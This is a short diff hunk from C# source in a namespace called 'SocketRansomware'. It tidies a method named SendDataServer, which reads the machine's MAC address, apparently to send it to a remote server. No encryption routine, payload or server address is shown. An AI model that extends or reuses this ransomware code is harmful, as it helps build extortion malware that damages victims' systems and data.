@@ -49,9 +49,9 @@ namespace SocketRansomware
         private void SendDataServer()
         {
             byte[] buffer = new byte[1024];
-            string str = string.Empty;
+
             //mac address
-            str = NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString();
+            string str = NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString();
 
             try
             {
